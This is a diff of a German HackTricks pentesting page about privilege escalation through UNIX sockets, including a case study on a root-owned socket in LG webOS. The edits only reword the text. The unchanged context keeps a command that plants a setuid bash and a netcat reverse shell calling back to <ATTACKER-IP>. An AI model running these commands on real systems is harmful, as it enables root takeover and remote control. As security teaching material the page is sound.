@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Beispiel für Socket-Bindung mit Python
+## Socket binding example with Python
 
-Im folgenden Beispiel wird ein **unix socket erstellt** (`/tmp/socket_test.s`) und alles, was **empfangen** wird, wird von `os.system` **ausgeführt**. Ich weiß, dass du so etwas nicht in freier Wildbahn finden wirst, aber das Ziel dieses Beispiels ist zu zeigen, wie Code aussieht, der unix sockets verwendet, und wie man die Eingaben im schlimmstmöglichen Fall handhabt.
+Im folgenden Beispiel wird ein **unix socket** (`/tmp/socket_test.s`) erstellt und alles, was **empfangen** wird, von `os.system` **ausgeführt**. Ich weiß, dass du so etwas in freier Wildbahn wahrscheinlich nicht finden wirst, aber das Ziel dieses Beispiels ist zu zeigen, wie Code aussieht, der unix sockets verwendet, und wie man die Eingabe im schlimmstmöglichen Fall handhabt.
 ```python:s.py
 import socket
 import os, os.path
@@ -39,13 +39,13 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## Fallstudie: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-Einige privilegierte Daemons exponieren einen root-owned UNIX socket, der untrusted input akzeptiert und privilegierte Aktionen an thread-IDs und signals koppelt. Wenn das Protokoll einem nicht-privilegierten Client erlaubt, zu beeinflussen, welcher native Thread ins Visier genommen wird, könnten Sie einen privilegierten Codepfad auslösen und eskalieren.
+Einige privilegierte Daemons öffnen einen root-owned UNIX socket, der untrusted input akzeptiert und privilegierte Aktionen an thread-IDs und signals koppelt. Wenn das Protokoll einem nicht-privilegierten Client erlaubt zu beeinflussen, welcher native Thread das Ziel ist, kann man möglicherweise einen privilegierten Codepfad auslösen und Privilegien erlangen.
 
 Beobachtetes Muster:
 - Mit einem root-owned Socket verbinden (z. B. /tmp/remotelogger).
 - Einen Thread erstellen und dessen native thread id (TID) ermitteln.
 - Die TID (packed) plus Padding als Request senden; eine Bestätigung erhalten.
-- Ein bestimmtes Signal an diese TID senden, um das privilegierte Verhalten auszulösen.
+- Ein bestimmtes signal an diese TID senden, um das privilegierte Verhalten auszulösen.
 
 Minimale PoC-Skizze:
 ```python
@@ -65,8 +65,8 @@ rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Hinweise:
-- Diese Klasse von Fehlern entsteht dadurch, dass Werten vertraut wird, die aus unprivilegiertem Client-Zustand (TIDs) abgeleitet wurden, und diese an privilegierte Signal-Handler oder Logik gebunden werden.
-- Absichern durch Erzwingen von Anmeldeinformationen auf dem Socket, Validieren von Nachrichtenformaten und Entkoppeln privilegierter Operationen von extern bereitgestellten Thread-Identifikatoren.
+- Diese Klasse von Bugs entsteht dadurch, dass Werten vertraut wird, die aus unprivilegiertem Client-Status (TIDs) abgeleitet sind, und diese an privilegierte Signal-Handler oder Logik gebunden werden.
+- Absichern durch Erzwingen von credentials auf dem socket, Validierung von Nachrichtenformaten und Entkopplung privilegierter Operationen von extern gelieferten Thread-Identifikatoren.
 
 ## Referenzen
 
